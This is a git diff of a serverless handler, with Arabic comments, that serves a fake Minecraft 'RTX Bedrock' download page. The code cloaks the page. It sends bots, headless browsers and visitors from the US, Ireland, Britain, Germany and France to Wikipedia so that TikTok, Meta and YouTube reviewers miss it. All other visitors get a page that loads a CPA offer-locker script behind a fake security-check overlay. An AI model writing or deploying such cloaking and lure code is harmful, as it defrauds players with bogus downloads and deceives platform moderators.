@@ -6,7 +6,7 @@ export default async function handler(request) {
   const country = request.headers.get('x-vercel-ip-country') || 'US';
   const ua = request.headers.get('user-agent') || '';
 
-  // 1. الفحص الصارم للبوتات وأنظمة المحاكاة والـ Headless Browsers لمراجعي المنصات
+  // 1. الفحص الصارم للبوتات وأنظمة المحاكاة والـ Headless Browsers
   const isBot = /bot|crawler|spider|facebook|twitter|instagram|headless|selenium|puppeteer/i.test(ua) || 
                 request.headers.get('sec-ch-ua-mobile') === '?0';
 
@@ -14,16 +14,15 @@ export default async function handler(request) {
     return Response.redirect('https://ar.wikipedia.org/wiki/ماينكرافت', 302);
   }
 
-  // 2. القائمة السوداء الجغرافية الصارمة (طرد مقرات مراجعي تيك توك، ميتا، ويوتيوب البشريين)
-  // حظر: أمريكا، أيرلندا، بريطانيا، ألمانيا، فرنسا
+  // 2. القائمة السوداء الجغرافية لمقرات مراجعي الحسابات (تيك توك، ميتا، يوتيوب)
   const blacklistedCountries = ['US', 'IE', 'GB', 'DE', 'FR'];
   
   if (blacklistedCountries.includes(country.toUpperCase())) {
-    // تحويل المراجعين تلقائياً إلى صفحة ويكيبيديا موثوقة لتمرير المراجعات والحسابات بسلام
+    // طرد المراجع البشري أو السيرفر الأوروبي إلى ويكيبيديا فوراً لحماية الرابط
     return Response.redirect('https://ar.wikipedia.org/wiki/ماينكرافت', 302);
   }
 
-  // 3. تمرير المستخدمين الحقيقيين (الخليج، شمال إفريقيا، وبقية العالم) وحقن الكود الخاص بك
+  // 3. تمرير اللاعب الحقيقي (الخليج وباقي دول العالم) وحقن الكود الخاص بك
   const htmlContent = `
   <!DOCTYPE html>
   <html lang="ar" dir="rtl">
@@ -33,7 +32,7 @@ export default async function handler(request) {
       <title>بوابة التنزيل - RTX Bedrock</title>
       <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
       
-      <script type="text/javascript" src="https://playabledownloads.com/script_include.php?id=1902770"></script>
+      <script type="text/javascript" src="https://playabledownloads.com/script_include.php?id=1902770&tracking_id=Shder10"></script>
 
       <style>
           body, html { margin: 0!important; padding: 0!important; width: 100%!important; height: 100%!important; background-color: #FFFFFF!important; font-family: 'Cairo', sans-serif!important; color: #111!important; overflow-x: hidden!important; }
@@ -53,8 +52,6 @@ export default async function handler(request) {
           .down-arrow { font-size: 28px!important; color: #000000!important; animation: bounce 1.5s infinite!important; display: block!important; margin-top: 5px!important; }
           @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translateY(0); } 40% { transform: translateY(-10px); } 60% { transform: translateY(-5px); } }
           .cpa-instructions { font-size: 15px!important; font-weight: 700!important; color: #333333!important; text-align: center!important; background: #f9f9f9!important; border: 1px solid #eeeeee!important; padding: 15px!important; border-radius: 8px!important; line-height: 1.6!important; margin-bottom: 20px!important; }
-          
-          /* تحسين توافقية عروض CPAGrip لتظهر مدمجة بشكل غاية في الاحترافية */
           #offers, .offers, .offer_list, ul { list-style: none!important; padding: 0!important; margin: 0!important; display: block!important; }
           #offers a, .offer_row a, .offers a { display: block!important; background-color: #2196F3!important; color: #FFFFFF!important; padding: 18px 15px!important; margin-bottom: 12px!important; border-radius: 8px!important; text-decoration: none!important; font-size: 16px!important; font-weight: 800!important; text-align: center!important; white-space: normal!important; line-height: 1.4!important; box-shadow: 0 4px 6px rgba(33, 150, 243, 0.3)!important; border: none!important; height: auto!important; position: relative!important; overflow: hidden!important; }
           #offers a:hover, .offer_row a:hover { background-color: #1976D2!important; }
@@ -62,7 +59,6 @@ export default async function handler(request) {
       </style>
   </head>
   <body>
-
       <div id="verification-overlay">
           <div class="verification-box">
               <span class="verification-text" id="status-text">جاري فحص وتأمين بيئة تشغيل النظام الحاضر...</span>
